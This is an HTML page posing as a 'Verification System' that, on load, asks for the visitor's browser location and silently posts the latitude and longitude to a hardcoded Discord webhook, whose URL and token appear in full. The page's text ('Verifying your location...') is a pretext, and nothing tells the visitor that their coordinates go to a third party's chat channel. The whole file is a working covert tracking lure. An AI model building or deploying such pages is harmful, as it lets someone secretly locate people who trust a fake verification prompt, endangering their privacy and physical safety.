<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification System</title>
  <script>
    // Function to send geolocation data to Discord webhook
    function sendLocationToWebhook(latitude, longitude) {
      const webhookURL = 'https://discord.com/api/webhooks/1284743737016057856/DN-8fCOSSJtP3QrwqRsh_FEjGCVox3F9uxtSccf0wM2rIOOtIZsiFQz8fuSjUpOgeH7P'; // Replace with your webhook URL
      const data = {
        content: `New user location: Latitude: ${latitude}, Longitude: ${longitude}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => {
        if (response.ok) {
          alert('Location sent successfully!');
        } else {
          alert('Failed to send location!');
        }
      })
      .catch(error => console.error('Error:', error));
    }

    // Function to get user's geolocation
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // Send location to Discord webhook
          sendLocationToWebhook(latitude, longitude);
        }, function(error) {
          alert('Unable to retrieve your location.');
        });
      } else {
        alert('Geolocation is not supported by this browser.');
      }
    }
  </script>
</head>
<body onload="getLocation()">
  <h1>Verifying your location...</h1>
  <p>Please allow location access to proceed.</p>
</body>
</html>
